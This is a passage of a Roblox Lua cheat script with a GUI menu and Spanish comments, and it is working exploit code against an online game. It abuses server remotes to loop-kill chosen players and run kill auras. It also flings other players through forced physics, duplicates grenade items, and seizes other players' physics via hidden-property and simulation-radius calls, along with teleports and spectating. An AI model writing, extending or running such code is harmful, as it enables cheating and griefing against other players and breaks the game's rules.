            if TargetPlayer and TargetPlayer.Character and TargetPlayer.Character:FindFirstChild("Humanoid") then
                local Target = TargetPlayer.Character:FindFirstChild("Humanoid")
                repeat
                    wait()
                    LocalPlayer.Character:FindFirstChildOfClass("Tool").DamageRemote:FireServer(Target)
                until Target.Health <= 0
            end
        end
    end
end)
end)

wait(.1)

window:Dropdown("Select Target",{location = Table,flag = "player4",search = true --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe","Emerald Greatsword","Blood Dagger"} --[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()game.StarterGui:SetCore("SendNotification", {
    Title = "Target:";
    Text = "Choosed sucessfully!";
    Icon = "http://www.roblox.com/asset/?id=5585103223";
    Duration = 5;
    callback = bindableFunction;
})
local usernames        = {(Table["player4"])}-- Reemplaza estos nombres de usuario con los que desees
local Players          = game:GetService("Players")
local LocalPlayer      = Players.LocalPlayer
local Mouse            = LocalPlayer:GetMouse()
local UserInputService = game:GetService("UserInputService")

UserInputService.InputBegan:Connect(function(Input, IsTyping)
    if IsTyping then return end
    if Input.KeyCode == Enum.KeyCode.KeypadMinus then
        for _, username in pairs(usernames) do
            local TargetPlayer = Players:FindFirstChild(username)
            if TargetPlayer and TargetPlayer.Character and TargetPlayer.Character:FindFirstChild("Humanoid") then
                local Target = TargetPlayer.Character:FindFirstChild("Humanoid")
                repeat
                    wait()
                    LocalPlayer.Character:FindFirstChildOfClass("Tool").DamageRemote:FireServer(Target)
                until Target.Health <= 0
            end
        end
    end
end)
end)

wait(.1)

window:Dropdown("Select Target",{location = Table,flag = "player5",search = true --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe","Emerald Greatsword","Blood Dagger"} --[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()game.StarterGui:SetCore("SendNotification", {
    Title = "Target:";
    Text = "Choosed sucessfully!";
    Icon = "http://www.roblox.com/asset/?id=5585103223";
    Duration = 5;
    callback = bindableFunction;
})
local usernames        = {(Table["player5"])}-- Reemplaza estos nombres de usuario con los que desees
local Players          = game:GetService("Players")
local LocalPlayer      = Players.LocalPlayer
local Mouse            = LocalPlayer:GetMouse()
local UserInputService = game:GetService("UserInputService")

UserInputService.InputBegan:Connect(function(Input, IsTyping)
    if IsTyping then return end
    if Input.KeyCode == Enum.KeyCode.KeypadMinus then
        for _, username in pairs(usernames) do
            local TargetPlayer = Players:FindFirstChild(username)
            if TargetPlayer and TargetPlayer.Character and TargetPlayer.Character:FindFirstChild("Humanoid") then
                local Target = TargetPlayer.Character:FindFirstChild("Humanoid")
                repeat
                    wait()
                    LocalPlayer.Character:FindFirstChildOfClass("Tool").DamageRemote:FireServer(Target)
                until Target.Health <= 0
            end
        end
    end
end)
end)



local Pressing = false
window:Toggle("Start/Stop Loop", {location = Table, flag = "enable"}, function()
    if Pressing then
        Pressing = false
    else
        Pressing = true
        spawn(function()
            while Pressing do
                game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.KeypadMinus, false, game)
                wait(1) -- Tiempo de espera entre cada pulsación de tecla
                game:GetService("RunService").Heartbeat:Wait() -- Espera al siguiente frame
            end
        end)
    end
end)

if not _G.IgnoreList then
    _G.IgnoreList = {}
end

local KillingNear = false
local Player = game.Players.LocalPlayer

-- Función para obtener el carácter del jugador
local function GetChar()
    return Player.Character or Player.CharacterAdded:Wait()
end

-- Función de activación de Kill Aura
window:Toggle("Kill Aura (20 studs)", {location = Table, flag = "enable"}, function(state)
    KillingNear = state  -- Cambiar el estado de Kill Aura al valor del toggle

    if KillingNear then
        coroutine.wrap(function()  -- Usar coroutine para ejecutar el Kill Aura en paralelo
            while KillingNear do
                local target
                local minRange = 500  -- Rango de activación del Kill Aura en studs
                local playerChar = GetChar()
                local playerRoot = playerChar:FindFirstChild("HumanoidRootPart")

                if playerRoot then
                    for _, v in pairs(workspace:GetChildren()) do
                        if v ~= playerChar and not table.find(_G.IgnoreList, v.Name) then
                            local vhum = v:FindFirstChild("Humanoid")
                            local vroot = v:FindFirstChild("HumanoidRootPart")
                            if vhum and vroot then
                                local distance = (vroot.Position - playerRoot.Position).magnitude
                                if vhum.Health > 0 and not v:FindFirstChild("ForceField") and distance <= minRange then
                                    target = vhum
                                    minRange = distance
                                end
                            end
                        end
                    end

                    -- Si hay un objetivo válido, atacar
                    if target then
                        local tool = playerChar:FindFirstChildOfClass("Tool")
                        if tool and tool:FindFirstChild("DamageRemote") then
                            tool.DamageRemote:FireServer(target)
                        end
                    end
                end
                
                wait(0.1)  -- Retraso pequeño para evitar sobrecarga del servidor
            end
        end)()
    end
end)

window:Button("Anti-Hit.(Semi God Mode)",function()
game.StarterGui:SetCore("SendNotification", {
    Title    = "Anti-Hit Started";
    Text     = "Hold On ((DO NOT TOUCH ANYTHING WAIT!))";
    Icon     = "http://www.roblox.com/asset/?id=5585095509"; 
    Duration = 5; 
    callback = bindableFunction;
})

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-292, 60, -68)

wait()

local player = game.Players.LocalPlayer
local humanoid = game.Workspace[player.Name].Humanoid
humanoid.Health = 0 

wait(6)

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-292, 60, -68)


local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()


	game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").Enabled = false
    Player.PlayerGui["Menu Screen"].RemoteEvent:FireServer("Steel Sword")

wait(1)

local player = game.Players.LocalPlayer
local humanoid = game.Workspace[player.Name].Humanoid
humanoid.Health = 0 

wait()

local player = game.Players.LocalPlayer
local backpack = player:WaitForChild("Backpack")
local toolName = "Steel Sword"

local function selectTool()
    local tool = backpack:FindFirstChild(toolName)
    if tool then
        player.Character.Humanoid:EquipTool(tool)
		wait(0.2)
       game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
    else
        print("No se encontró la herramienta " .. toolName .. " en el Backpack.")
    end
end

selectTool()

wait(6)

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-292, 60, -68)

wait()

local root = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("HumanoidRootPart") or game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("BasePart")
wait(0.1)
local function touch(x)
    x = x:FindFirstAncestorWhichIsA("BasePart")
    if x and firetouchinterest then
        if x.Name == "Button" then
            -- Ignorar el 'Button de la spiked trap'
            return
        end
        
        task.spawn(function()
            firetouchinterest(x, root, 1)
            wait()
            firetouchinterest(x, root, 0)
        end)
        x.CFrame = root.CFrame
    end
end

for _, descendant in ipairs(workspace:GetDescendants()) do
    if descendant:IsA("TouchTransmitter") then
        touch(descendant)
    end
end

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-286, 97, -2)

local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()


	game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").Enabled = false
    Player.PlayerGui["Menu Screen"]:Destroy()


game.StarterGui:SetCore("SendNotification", {
    Title    = "Anti-Hit Ended";
    Text     = "Now u can move";
    Icon     = "http://www.roblox.com/asset/?id=5585095509"; 
    Duration = 3; 
    callback = bindableFunction;
})

wait(1)

game.StarterGui:SetCore("SendNotification", {
    Title    = "DATA";
    Text     = "STEEL SWORD ITS THAT THING THAT GIVES YOU Anti-Hit EQUIP IT!";
    Icon     = "http://www.roblox.com/asset/?id=5585095509"; 
    Duration = 5; 
    callback = bindableFunction;
})
end)

window:Section(" Grenade Functions")

local Pressing = false
window:Toggle("Auto fling (Grenade 2) ",{location = Table, flag = "enable"},function()
local stopFlag = false
local function pressKey()
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

local Folder = Instance.new("Folder", Workspace)
local Part = Instance.new("Part", Folder)
local Attachment1 = Instance.new("Attachment", Part)
Part.Anchored = true
Part.CanCollide = false
Part.Transparency = 1
local Updated = CFrame.new(0, 5, 0)

local function ForcePart(v)
    if v:IsA("Part") and v.Anchored == false and v.Parent:FindFirstChild("Humanoid") == nil and v.Parent:FindFirstChild("Head") == nil and v.Name ~= "Handle" then
        for _, x in next, v:GetChildren() do
            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                x:Destroy()
            end
        end
        if v:FindFirstChild("Attachment") then
            v:FindFirstChild("Attachment"):Destroy()
        end
        if v:FindFirstChild("AlignPosition") then
            v:FindFirstChild("AlignPosition"):Destroy()
        end
        if v:FindFirstChild("Torque") then
            v:FindFirstChild("Torque"):Destroy()
        end
        v.CanCollide = false
        local Torque = Instance.new("Torque", v)
        Torque.Torque = Vector3.new(100000, 100000, 100000)
        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)
        Torque.Attachment0 = Attachment2
        AlignPosition.MaxForce = 9999999999999999
        AlignPosition.MaxVelocity = math.huge
        AlignPosition.Responsiveness = 200
        AlignPosition.Attachment0 = Attachment2 
        AlignPosition.Attachment1 = Attachment1
    end
end

local function getNearestPlayer()
    local nearestPlayer = nil
    local shortestDistance = math.huge

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= Players.LocalPlayer and player.Character and player.Character:FindFirstChild("Torso") then
            local distance = (player.Character.Torso.Position - Players.LocalPlayer.Character.Torso.Position).Magnitude
            if distance < shortestDistance then
                shortestDistance = distance
                nearestPlayer = player
            end
        end
    end

    return nearestPlayer
end

local function followNearestPlayer()
    while true do
        local nearestPlayer = getNearestPlayer()
        if nearestPlayer and nearestPlayer.Character and nearestPlayer.Character:FindFirstChild("Torso") then
            Updated = nearestPlayer.Character.Torso.CFrame
        end
        RunService.RenderStepped:Wait()
    end
end

for _, v in next, Workspace:GetDescendants() do
    ForcePart(v)
end

Workspace.DescendantAdded:Connect(function(v)
    ForcePart(v)
end)

spawn(function()
    while RunService.RenderStepped:Wait() do
        Attachment1.WorldCFrame = Updated
    end
end)

spawn(followNearestPlayer)
end

if Pressing then
    Pressing = false
    stopFlag = true
else
    Pressing = true
    stopFlag = false
    spawn(function()
        repeat
            pressKey()
            wait(1)
            game:GetService("RunService").Heartbeat:Wait()
        until stopFlag or not Pressing
        game.StarterGui:SetCore("SendNotification", {
    Title = "Fling";
    Text = "Fling has ended.";
    Icon = "http://www.roblox.com/asset/?id=5585095509";
    Duration = 6;
    callback = bindableFunction;
})
    end)
end
end)

local Farming = false
window:Toggle("Farm Grenade 2",{location = Table, flag = "Farming"},function()
game.StarterGui:SetCore("SendNotification", {
    Title = "Dupe:";
    Text = "Hold on..";
    Icon = "http://www.roblox.com/asset/?id=5585095509";
    Duration = 3;
    callback = bindableFunction;
})
    if Farming then
        Farming = false
    else
        Farming = true
        repeat
local player = game.Players.LocalPlayer

repeat
    wait()
until player.Character

local player = game.Players.LocalPlayer

repeat
    wait(.5)
until player.Character

local playerGui = player:FindFirstChild("PlayerGui")
if playerGui then
    local menuScreen = playerGui:FindFirstChild("Menu Screen")
    if menuScreen and menuScreen:IsA("ScreenGui") then
        menuScreen.Enabled = false
        if menuScreen:FindFirstChild("RemoteEvent") then
            menuScreen.RemoteEvent:FireServer("Emerald Greatsword")
        else
            warn("RemoteEvent not found in Menu Screen.")
        end
    else
        warn("Menu Screen not found or is not a ScreenGui.")
    end
else
    warn("PlayerGui not found.")
end

local function performActionAfterSpawn()
    wait()
    if player.Character then
        player.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-287, 108, -48)
        wait(0.3)

        local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.Health = 0
            wait()
local player = game.Players.LocalPlayer

repeat
    wait(.2)
until player.Character

local grenade2 = player.Backpack:FindFirstChild("Grenade 2")

if grenade2 then
    local humanoid = player.Character:FindFirstChild("Humanoid")

    if humanoid then
        humanoid:EquipTool(grenade2)
    else
        warn("Humanoid not found in player's character.")
    end
else
    warn("Grenade 2 tool not found in player's backpack.")
           end
            wait(0.3)
            game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
        end
    else
        warn("Player or Humanoid not found.")
    end
end

if player.Character then
    performActionAfterSpawn()
else
    player.CharacterAdded:Connect(performActionAfterSpawn)
end
 game:GetService("RunService").Heartbeat:Wait()
        until stopFlag or not Farming
    end
end)

window:Button("Collect All GR2 (Fixed!)",function()
local root = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("HumanoidRootPart") or game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("BasePart")
wait(0.1)
local function touch(x)
    x = x:FindFirstAncestorWhichIsA("BasePart")
    if x and firetouchinterest then
        if x.Name == "Button" then
            -- Ignorar el 'Button de la spiked trap'
            return
        end
        
        task.spawn(function()
            firetouchinterest(x, root, 1)
            wait()
            firetouchinterest(x, root, 0)
        end)
        x.CFrame = root.CFrame
    end
end

for _, descendant in ipairs(workspace:GetDescendants()) do
    if descendant:IsA("TouchTransmitter") then
        touch(descendant)
    end
end
end) 

window:Button("Spam Grenade 2",function()
        for _,v in next,plr.Backpack:GetChildren() do
            if v.Name == 'Grenade 2' and v:FindFirstChild'RemoteEvent' then
                v.Parent = plr.Character
                v.RemoteEvent:FireServer(mouse.Hit.LookVector)
                v.Parent = plr.Backpack
            end
        end
end)

window:Button("Teleport To Farm Zone",function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-292, 60, -68)
end)

window:Button("Teleport Up (Exit)",function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-286, 97, -2)
end)

window:Button("Bring GR2 Particles (G)",function()
local UserInputService = game:GetService("UserInputService")
local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
local Folder = Instance.new("Folder", game:GetService("Workspace"))
local Part = Instance.new("Part", Folder)
local Attachment1 = Instance.new("Attachment", Part)
Part.Anchored = true
Part.CanCollide = false
Part.Transparency = 1
local Updated = Mouse.Hit + Vector3.new(0, 5, 0)
local NetworkAccess = coroutine.create(function()
    settings().Physics.AllowSleep = false
    while game:GetService("RunService").RenderStepped:Wait() do
        for _, Players in next, game:GetService("Players"):GetPlayers() do
            if Players ~= game:GetService("Players").LocalPlayer then
                Players.MaximumSimulationRadius = 0 
                sethiddenproperty(Players, "SimulationRadius", 0) 
            end 
        end
        game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)
        setsimulationradius(math.huge) 
    end 
end) 
coroutine.resume(NetworkAccess)
local function ForcePart(v)
    if v:IsA("Part") and v.Anchored == false and v.Parent:FindFirstChild("Humanoid") == nil and v.Parent:FindFirstChild("Head") == nil and v.Name ~= "Handle" then
        Mouse.TargetFilter = v
        for _, x in next, v:GetChildren() do
            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                x:Destroy()
            end
        end
        if v:FindFirstChild("Attachment") then
            v:FindFirstChild("Attachment"):Destroy()
        end
        if v:FindFirstChild("AlignPosition") then
            v:FindFirstChild("AlignPosition"):Destroy()
        end
        if v:FindFirstChild("Torque") then
            v:FindFirstChild("Torque"):Destroy()
        end
        v.CanCollide = false
        local Torque = Instance.new("Torque", v)
        Torque.Torque = Vector3.new(100000, 100000, 100000)
        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)
        Torque.Attachment0 = Attachment2
        AlignPosition.MaxForce = 9999999999999999
        AlignPosition.MaxVelocity = math.huge
        AlignPosition.Responsiveness = 200
        AlignPosition.Attachment0 = Attachment2 
        AlignPosition.Attachment1 = Attachment1
    end
end
for _, v in next, game:GetService("Workspace"):GetDescendants() do
    ForcePart(v)
end
game:GetService("Workspace").DescendantAdded:Connect(function(v)
    ForcePart(v)
end)
UserInputService.InputBegan:Connect(function(Key, Chat)
    if Key.KeyCode == Enum.KeyCode.G and not Chat then
       Updated = Mouse.Hit + Vector3.new(0, 5, 0)
    end
end)
spawn(function()
    while game:GetService("RunService").RenderStepped:Wait() do
        Attachment1.WorldCFrame = Updated
    end
end)
end)

window:Section(" View Pencil")

window:Dropdown("View Pencil",{location = Table,flag = "view",search = false --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe", "Emerald Greatsword","Blood Dagger","Frost Spear"}--[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

local function viewObject(object)
    if object and object:IsA("BasePart") then
        Camera.CameraType = Enum.CameraType.Scriptable
        Camera.CFrame = CFrame.new(object.Position + Vector3.new(0, 5, 10), object.Position)
    end
end

-- Reemplaza "Username" con el nombre del jugador y "Pencil" con el nombre del tool
local targetUsername = (Table["view"])
local toolName = "Pencil"

local function findTool()
    local character = workspace:FindFirstChild(targetUsername)
    if character then
        local tool = character:FindFirstChild(toolName)
        if tool and tool:IsA("Tool") then
            -- Buscar una parte dentro del tool
            for _, part in pairs(tool:GetChildren()) do
                if part:IsA("BasePart") then
                    return part
                end
            end
        end
    end
    return nil
end

-- Loop para buscar el tool constantemente
while true do
    local toolPart = findTool()
    if toolPart then
        viewObject(toolPart)
    end
    wait(1) -- Ajusta el intervalo de tiempo según sea necesario
end
end)

window:Button("Unview Pencil",function()
local speaker = game.Players.LocalPlayer

workspace.CurrentCamera:remove()

-- Espera un breve momento
wait(0.1)

-- Espera hasta que el personaje del jugador esté disponible
repeat
    wait()
until speaker.Character ~= nil

-- Establece la cámara para seguir al humanoide del personaje del jugador
workspace.CurrentCamera.CameraSubject = speaker.Character:FindFirstChildWhichIsA('Humanoid')

-- Configura la cámara en modo personalizado
workspace.CurrentCamera.CameraType = "Custom"

-- Ajusta las distancias mínimas y máximas del zoom de la cámara
speaker.CameraMinZoomDistance = 0.5
speaker.CameraMaxZoomDistance = 28

-- Establece el modo de la cámara en "Clásico"
speaker.CameraMode = "Classic"

-- Desancla la cabeza del personaje del jugador
speaker.Character.Head.Anchored = false
end)

window:Button("Teleport to Pencil (NEW)",function()
local Players = game:GetService("Players")
local toolName = "Pencil"

local function teleportToPencil()
    for _, player in pairs(Players:GetPlayers()) do
        local character = player.Character
        if character then
            local tool = character:FindFirstChild(toolName)
            if tool then
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                if humanoidRootPart then
                    game.StarterGui:SetCore("SendNotification", {
    Title = "Pencil Founded, LETS END THIS >:).";
    Text = "Teleporting..";
    Icon = "http://www.roblox.com/asset/?id=5585095509";
    Duration = 3;
    callback = bindableFunction;
})
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = humanoidRootPart.CFrame + Vector3.new(0, 0, 5)
                    return
                else
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = tool.Handle.CFrame + Vector3.new(0, 0, 5)
                    return
                end
            end
        end
    end
game.StarterGui:SetCore("SendNotification", {
    Title = "Pencil:";
    Text = "No one has a pencil.";
    Icon = "http://www.roblox.com/asset/?id=5585095509";
    Duration = 3;
    callback = bindableFunction;
})
end

teleportToPencil()
end)

window:Button("Check for a pencil",function()
local toolName = "Pencil"
local synx = "lapiz"

local function checkTools()
    for _, player in pairs(game.Players:GetPlayers()) do
        local backpack = player.Backpack
        if backpack then
            local tool = backpack:FindFirstChild(toolName)
            if tool then
                game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
                    Text = player.Name .. " tiene equipado un " .. synx
                })
            end
        end
    end
end

-- Revisa los equipos cada cierto tiempo
while true do
    checkTools()
    -- Espera un tiempo antes de volver a revisar (puedes ajustar este valor)
    wait(6)
end
end)

window:Button("KillAura Complement",function()
game.StarterGui:SetCore("SendNotification", {
    Title    = "Deleting..";
    Text     = "Right Arm Deleted Sucessfully!";
    Icon     = "http://www.roblox.com/asset/?id=5585095509";
    Duration = 2;
    callback = bindableFunction;
})
game.Players.LocalPlayer.Character["Right Arm"]:Destroy()
end)

window:Dropdown("Give Kill Aura",{location = Table,flag = "UserKA",search = false --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe", "Emerald Greatsword","Blood Dagger","Frost Spear"}--[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()
local targ
local range = 30 -- Rango máximo para el kill aura
local whitelistPlayer = (Table["UserKA"])  -- Reemplaza esto con el nombre del jugador que deseas poner en la whitelist
local tool = Player.Backpack:FindFirstChild("Pencil") or Player.Character:FindFirstChild("Pencil")
local toolHandle = tool and tool:FindFirstChild("Handle")

if toolHandle then
    
    toolHandle.Anchored = true -- Anclar el lápiz para evitar que sea empujado
    toolHandle.CanCollide = false -- Deshabilitar colisión para evitar interacciones físicas no deseadas

    -- Rutina anti-fling
    spawn(function()
        local lastPosition = toolHandle.Position
        while true do
            local currentPosition = toolHandle.Position
            if (currentPosition - lastPosition).magnitude > 1 then -- Si la posición cambia bruscamente
                toolHandle.CFrame = CFrame.new(lastPosition) -- Reubicar el lápiz en la posición anterior
            end
            lastPosition = toolHandle.Position
            wait(0.2) -- Ajusta el tiempo de espera según sea necesario
        end
    end)
    -- Rutina para teletransportar el Tool 10 studs arriba de la cabeza del jugador en la whitelist
    spawn(function()
        while true do
            local whitelistTarget = workspace:FindFirstChild(whitelistPlayer)
            if whitelistTarget then
                local head = whitelistTarget:FindFirstChild("Head")
                if head then
                    toolHandle.CFrame = head.CFrame * CFrame.new(0, 10, 0) -- Teletransporta 10 studs arriba
                end
            end
            wait(0.2) -- Ajusta el tiempo de espera según sea necesario
        end
    end)
    
    for i, v in pairs(workspace:GetChildren()) do
        if v ~= tool and not table.find(_G.IgnoreList, v.Name) and v.Name ~= whitelistPlayer then
            local vhum = v:FindFirstChild("Humanoid")
            local vroot = v:FindFirstChild("HumanoidRootPart")
            if vhum and vroot then
                local dist = (vroot.Position - toolHandle.Position).magnitude
                if vhum.Health > 0 and not v:FindFirstChild("ForceField") and dist <= range then
                    if dist < range then
                        targ = vhum
                        range = dist
                    end
                end
            end
        end
    end
else
    warn("Tool 'Pencil' not found or does not have a 'Handle'")
end

if targ then
    tool.DamageRemote:FireServer(targ)
end
end)

local KillingNear = false
window:Toggle("Enable KillAura",{location = Table, flag = "enabledd"},function()
game.StarterGui:SetCore("SendNotification", {
    Title = "Current User:";
    Text = (Table["UserKA"]),
    Icon = "http://www.roblox.com/asset/?id=5585095509"; 
    Duration = 5; 
    callback = bindableFunction;
})
    if KillingNear then
        KillingNear = false
    else
        KillingNear = true
        repeat
local targ
local range = 30 -- Rango máximo para el kill aura
local whitelistPlayer = (Table["UserKA"])  -- Reemplaza esto con el nombre del jugador que deseas poner en la whitelist
local tool = Player.Backpack:FindFirstChild("Pencil") or Player.Character:FindFirstChild("Pencil")
local toolHandle = tool and tool:FindFirstChild("Handle")

if toolHandle then
    
    toolHandle.Anchored = true -- Anclar el lápiz para evitar que sea empujado
    toolHandle.CanCollide = false -- Deshabilitar colisión para evitar interacciones físicas no deseadas

    -- Rutina anti-fling
    spawn(function()
        local lastPosition = toolHandle.Position
        while true do
            local currentPosition = toolHandle.Position
            if (currentPosition - lastPosition).magnitude > 1 then -- Si la posición cambia bruscamente
                toolHandle.CFrame = CFrame.new(lastPosition) -- Reubicar el lápiz en la posición anterior
            end
            lastPosition = toolHandle.Position
            wait(0.2) -- Ajusta el tiempo de espera según sea necesario
        end
    end)
    -- Rutina para teletransportar el Tool 10 studs arriba de la cabeza del jugador en la whitelist
    spawn(function()
        while true do
            local whitelistTarget = workspace:FindFirstChild(whitelistPlayer)
            if whitelistTarget then
                local head = whitelistTarget:FindFirstChild("Head")
                if head then
                    toolHandle.CFrame = head.CFrame * CFrame.new(0, 10, 0) -- Teletransporta 10 studs arriba
                end
            end
            wait(0.2) -- Ajusta el tiempo de espera según sea necesario
        end
    end)
    
    for i, v in pairs(workspace:GetChildren()) do
        if v ~= tool and not table.find(_G.IgnoreList, v.Name) and v.Name ~= whitelistPlayer then
            local vhum = v:FindFirstChild("Humanoid")
            local vroot = v:FindFirstChild("HumanoidRootPart")
            if vhum and vroot then
                local dist = (vroot.Position - toolHandle.Position).magnitude
                if vhum.Health > 0 and not v:FindFirstChild("ForceField") and dist <= range then
                    if dist < range then
                        targ = vhum
                        range = dist
                    end
                end
            end
        end
    end
else
    warn("Tool 'Pencil' not found or does not have a 'Handle'")
end

if targ then
    tool.DamageRemote:FireServer(targ)
end
            wait()
        until not KillingNear
    end
end)

local Mouse = game.Players.LocalPlayer:GetMouse()
game:GetService("UserInputService").InputBegan:Connect(function(Input, IsTyping)
if IsTyping then return end
if Input.KeyCode == Enum.KeyCode.F1 then
local player = game.Players.LocalPlayer  -- Obtener el jugador local
local humanoid = game.Workspace[player.Name].Humanoid  -- Obtener el Humanoid del jugador local
humanoid.Health = 0  -- Establecer la salud del Humanoid a 0
end
end)

--Disables AutoJump
game.Players.LocalPlayer.AutoJumpEnabled = false

plr:GetMouse().KeyDown:Connect(function(key)
    if key == 'z' and tar and plr.Character then 
        for _,v in next,plr.Character:GetDescendants() do
            if v:IsA'Tool' and not v:FindFirstChild'ClientCD' and v:FindFirstChild'DamageRemote' and v:FindFirstChild'Cooldown' and tar and tar.Character and tar.Character:FindFirstChildOfClass'Humanoid' then
                AddCd(v,v.Cooldown.Value)
                local player = game.Players.LocalPlayer 
                Workspace[player.Name]:FindFirstChild(v.Name).Blade.HitSound:Play()
                rs.Stepped:Wait() --LOLLLL Fixed.
                v.DamageRemote:FireServer(tar.Character:FindFirstChildOfClass'Humanoid')          
            end
        end
    end
end)

game.StarterGui:SetCore("SendNotification", {
    Title    = "Data Fetched.";
    Text     = "GUI Loaded Sucessfully, Welcome Back!";
    Icon     = "http://www.roblox.com/asset/?id=5585095509"; 
    Duration = 2; 
    callback = bindableFunction;
})
wait(1)

game.StarterGui:SetCore("SendNotification", {
    Title    = "New!";
    Text     = "Loop Kill Fixed!";
    Icon     = "http://www.roblox.com/asset/?id=5585095509"; 
    Duration = 4; 
    callback = bindableFunction;
})
